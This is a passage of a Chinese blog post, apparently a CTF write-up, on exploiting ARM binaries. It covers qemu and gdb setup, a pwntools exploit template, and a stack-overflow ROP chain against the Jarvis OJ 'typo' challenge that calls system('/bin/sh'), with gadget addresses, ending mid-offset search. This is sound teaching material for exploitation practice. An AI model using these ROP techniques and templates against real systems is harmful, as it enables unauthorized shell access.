<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>如何 pwn 掉一个 arm 的binary - localhost - Done with development, it&#39;s time to pwn.</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="M4x" />
  <meta name="description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0" />
<meta name="keywords" content="arm, qemu" />







<meta name="generator" content="Hugo 0.75.1" />


<link rel="canonical" href="https://bash-c.github.io/post/how-2-pwn-an-arm-binary/" />



<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.19ae5a432863a072ec64433bb1020bd6d3401129f87d6f2ad5af3bcfd84168a1.css" integrity="sha256-Ga5aQyhjoHLsZEM7sQIL1tNAESn4fW8q1a87z9hBaKE=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="如何 pwn 掉一个 arm 的binary" />
<meta property="og:description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bash-c.github.io/post/how-2-pwn-an-arm-binary/" />
<meta property="article:published_time" content="2018-07-31T20:00:54+08:00" />
<meta property="article:modified_time" content="2018-07-31T20:00:54+08:00" />
<meta itemprop="name" content="如何 pwn 掉一个 arm 的binary">
<meta itemprop="description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0">
<meta itemprop="datePublished" content="2018-07-31T20:00:54+08:00" />
<meta itemprop="dateModified" content="2018-07-31T20:00:54+08:00" />
<meta itemprop="wordCount" content="5940">



<meta itemprop="keywords" content="arm,pwn," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="如何 pwn 掉一个 arm 的binary"/>
<meta name="twitter:description" content="这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题 环境搭建 环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来 原文链接M4x@10.0"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo"># </a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          
        
      </li>
    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      # 
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          

        

      </li>
    
    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">如何 pwn 掉一个 arm 的binary</h1>
      
      <div class="post-meta">
        <time datetime="2018-07-31" class="post-time">
          2018-07-31
        </time>
        <div class="post-category">
            <a href="https://bash-c.github.io/categories/how2/"> how2 </a>
            
          </div>
        <span class="more-meta"> 5940 words </span>
          <span class="more-meta"> 12 min read </span>

        
        
          <span id="busuanzi_container_page_pv">
            | 阅读 <span id="busuanzi_value_page_pv"></span>
          </span>
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#环境搭建">环境搭建</a>
      <ul>
        <li><a href="#主机信息">主机信息：</a></li>
        <li><a href="#预备环境安装">预备环境安装：</a></li>
        <li><a href="#安装qemu">安装qemu：</a></li>
        <li><a href="#安装共享库">安装共享库：</a></li>
        <li><a href="#运行">运行：</a></li>
        <li><a href="#调试">调试：</a></li>
        <li><a href="#效果图">效果图：</a></li>
        <li><a href="#more">more：</a></li>
        <li><a href="#reference">reference：</a></li>
      </ul>
    </li>
    <li><a href="#运行和调试">运行和调试</a></li>
    <li><a href="#arm-下的函数调用约定">arm 下的函数调用约定</a></li>
    <li><a href="#jarvis-oj---typo">Jarvis oj - typo</a>
      <ul>
        <li><a href="#静态分析">静态分析</a></li>
        <li><a href="#思路">思路</a></li>
        <li><a href="#rop">ROP</a></li>
      </ul>
    </li>
    <li><a href="#codegate2018---melong">Codegate2018 - melong</a>
      <ul>
        <li><a href="#静态分析-1">静态分析</a></li>
        <li><a href="#思路分析">思路分析</a></li>
        <li><a href="#exp">exp</a></li>
      </ul>
    </li>
    <li><a href="#shanghai2018---baby_arm">Shanghai2018 - baby_arm</a>
      <ul>
        <li><a href="#静态分析-2">静态分析</a></li>
        <li><a href="#思路-1">思路</a></li>
        <li><a href="#notice">notice</a></li>
      </ul>
    </li>
    <li><a href="#more-1">More</a></li>
    <li><a href="#后记">后记</a></li>
    <li><a href="#last">Last</a></li>
    <li><a href="#reference-1">Reference</a></li>
  </ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <p>这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题</p>
<h2 id="环境搭建">环境搭建</h2>
<p>环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来</p>
<hr>
<blockquote>
<p>原文链接<a href="http://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html">M4x@10.0.0.55</a>
本文中用于展示的binary分别来自Jarvis OJ上pwn的add，typo两道题</p>
</blockquote>
<p>写这篇教程的主要目的是因为最近想搞其他系统架构的 pwn，因此第一步就是搭建环境了，网上搜索了一波，发现很多教程都是需要树莓派，芯片等硬件，然后自己编译 gdb，后来实践的过程中发现可以很简单地使用 qemu 实现运行和调试异架构 binary，因此在这里分享一下我的方法。</p>
<h3 id="主机信息">主机信息：</h3>
<p>以一台新装的 deepin 虚拟机(基于 debian)为例，详细信息如下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5av617a5j30lq0bu78m.jpg" alt=""></p>
<h3 id="预备环境安装">预备环境安装：</h3>
<ul>
<li>安装 git，gdb 和 gdb-multiarch</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get update
$ sudo apt-get install git gdb gdb-multiarch
</code></pre></td></tr></table>
</div>
</div><ul>
<li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件）</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pwndbg/pwndbg
$ <span class="nb">cd</span> pwndbg
$ ./setup.sh
</code></pre></td></tr></table>
</div>
</div><p>装好之后如图：</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5c1vzla8j30nb04t75m.jpg" alt=""></p>
<ul>
<li>
<p>安装pwntools，不必要，但绝对是写exp的神器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo pip install pwntools
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h3 id="安装qemu">安装qemu：</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo apt-get install qemu-user
$ sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386
</code></pre></td></tr></table>
</div>
</div><p>通过 qemu 模拟 arm/mips 环境，进而进行调试</p>
<h3 id="安装共享库">安装共享库：</h3>
<p>此时已经可以运行静态链接的 arm/mips binary 了，如下图：</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5crjvp5dj31400p0ngj.jpg" alt=""></p>
<p>但还不能运行动态链接的 binary，如下图：</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5csjo38rj313o05i779.jpg" alt=""></p>
<p>这就需要我们安装对应架构的共享库，可以通过如下命令搜索：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ apt search <span class="s2">&#34;libc6-&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ARCH&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5cudid7gj30xy0h7trd.jpg" alt=""></p>
<p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可</p>
<h3 id="运行">运行：</h3>
<p>静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p>
<p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，如下图32位的动态链接 mips binary</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d1guaxvj313m03bq55.jpg" alt=""></p>
<p>使用 -L 指定共享库：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add
</code></pre></td></tr></table>
</div>
</div><p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d3xxmfqj30z50c4ahc.jpg" alt=""></p>
<h3 id="调试">调试：</h3>
<p>可以使用 qemu 的 -g 指定端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ qemu-mipsel -g <span class="m">1234</span> -L /usr/mipsel-linux-gnu/ ./add
</code></pre></td></tr></table>
</div>
</div><p>然后使用gdb-multiarch进行调试，先指定架构，然后使用remote功能</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; <span class="nb">set</span> architecture mips <span class="o">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span class="o">)</span>
pwndbg&gt; target remote localhost:1234
</code></pre></td></tr></table>
</div>
</div><p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dbufgrjj31400p013o.jpg" alt=""></p>
<p>这样我们就能进行调试了</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt=""></p>
<h3 id="效果图">效果图：</h3>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt=""></p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dg64kb8j31400p0tgd.jpg" alt=""></p>
<h3 id="more">more：</h3>
<p>同样，如果想要运行或者调试其他架构的 binary，只需安装其他架构的 qemu 和共享库即可</p>
<h3 id="reference">reference：</h3>
<p><a href="https://docs.pwntools.com/en/stable/qemu.html">https://docs.pwntools.com/en/stable/qemu.html</a></p>
<p><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></p>
<hr>
<h2 id="运行和调试">运行和调试</h2>
<p>安装好 qemu 之后, 就可以在本地运行和调试 binary 了, 我写了一个模板:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;your_binary&#34;</span>

<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;remote_addr&#34;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;your_binary&#34;</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-arm&#34;</span><span class="p">,</span> <span class="s2">&#34;-g&#34;</span><span class="p">,</span> <span class="s2">&#34;1234&#34;</span><span class="p">,</span> <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;/usr/arm-linux-gnueabi&#34;</span><span class="p">,</span> <span class="s2">&#34;your_binary&#34;</span><span class="p">])</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;your_binary&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>说明一下:</p>
<ul>
<li>根据 pwntools 的 <a href="http://docs.pwntools.com/en/stable/context.html?highlight=context.binary#pwnlib-context-setting-runtime-variables">官方文档</a>, 使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数了</li>
</ul>
<blockquote>
<p>The recommended method is to use context.binary to automagically set all of the appropriate values.</p>
</blockquote>
<ul>
<li>
<p>python exp.py r 打远程</p>
</li>
<li>
<p>python exp.py l 本地测试</p>
</li>
<li>
<p>python exp.py d/a/b/&hellip; 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</p>
</li>
<li>
<p>这里只写了使用 arm-linux-gnueabi 的情况, 使用 arm-linux-gnueabihf 的话更改参数即可, 关于二者的区别可以参考这篇 <a href="https://www.cnblogs.com/xiaotlili/p/3306100.html">文章</a></p>
</li>
</ul>
<h2 id="arm-下的函数调用约定">arm 下的函数调用约定</h2>
<p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中</p>
<p>一图胜千言:</p>
<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt=""></p>
<p>by the way, arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转</p>
<p>接下来以几道题目为例进行分析</p>
<h2 id="jarvis-oj---typo">Jarvis oj - typo</h2>
<p><a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_typo">题目和脚本链接</a></p>
<h3 id="静态分析">静态分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●<span class="o">]</span> check typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/jarvisOJ_typo/typo&#39;</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
</code></pre></td></tr></table>
</div>
</div><p>32 位 arm 静态链接的程序, strip 过了, 并且没有开栈溢出保护, 因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ./typo
Let<span class="s1">&#39;s Do Some Typing Exercise~
</span><span class="s1">Press Enter to get start;
</span><span class="s1">Input ~ if you want to quit
</span><span class="s1">
</span><span class="s1">------Begin------
</span><span class="s1">inquiry
</span><span class="s1">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span class="s1">E.r.r.o.r.
</span><span class="s1">
</span><span class="s1">odour
</span><span class="s1">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span class="s1">qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock&#39;</span> failed.
qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion <span class="sb">`</span>!have_tb_lock<span class="err">&#39;</span> failed.
<span class="o">[</span>1<span class="o">]</span>    <span class="m">3426</span> segmentation fault  ./typo
</code></pre></td></tr></table>
</div>
</div><h3 id="思路">思路</h3>
<p>运行一下发现是一个打字游戏, 很容易就找到了溢出点, 利用 rop chain 构造 system(&quot;/bin/sh&quot;) 即可, /bin/sh 的地址比较好找, 只要找到 system 的地址, 这个题目就很容易解决了</p>
<p>binary 去除了符号表信息, 并不是太容易看出来函数功能, 幸运的是通过在 IDA 中查看 /bin/sh 的交叉引用, 我们能找到调用 system 的函数(sub_10BA8 函数中出现了 /bin/sh, 读过 system 源码的同学可以发现该函数与 system 的流程类似, 于是大胆猜测 sun_10BA8 即为 system, 后来事实证明确实是)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">sub_110B4</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">sub_10BA8</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>                     <span class="c1">// system(a1)
</span><span class="c1"></span>  <span class="k">else</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">sub_10BA8</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="s">&#34;exit 0&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><hr>
<p>后来发现，使用 <code>rizzo</code> 可以恢复出 system 的符号表，这样寻找 system 的地址就很容易了</p>
<h3 id="rop">ROP</h3>
<p>这样我们只需要找一个能控制 r0 的 gadget 寄存器就行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --only <span class="s2">&#34;pop|ret&#34;</span> <span class="p">|</span> grep r0
0x00020904 : pop <span class="o">{</span>r0, r4, pc<span class="o">}</span>
jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh          
Strings <span class="nv">information</span>
<span class="o">============================================================</span>
0x0006c384 : /bin/sh
</code></pre></td></tr></table>
</div>
</div><p>于是可以构造如下的栈结构</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">+------------+
|            |
|   padding  |
|            |
|            |
+------------+
| gadget_addr| &lt;- 0x20904
+------------+
| binsh_addr | &lt;- 0x6c384
+------------+
| junk_data  |
+------------+
| system_addr| &lt;- 0x100B4
+------------+
</code></pre></td></tr></table>
</div>
</div><p>这样在程序返回时, 经过 rop 就会实现 r0 -&gt; &ldquo;/bin/sh&rdquo;, r4 -&gt; junk_data, pc = system_addr 的效果, 进而执行 system(&quot;/bin/sh&quot;) 来 get shell</p>
<p>此时还有一个问题, 不知道 padding 的长度, 可以通过 pwntools 的 cyclic/cyclic -l 来找长度</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; cyclic <span class="m">200</span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg&gt; c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? <span class="o">()</span>
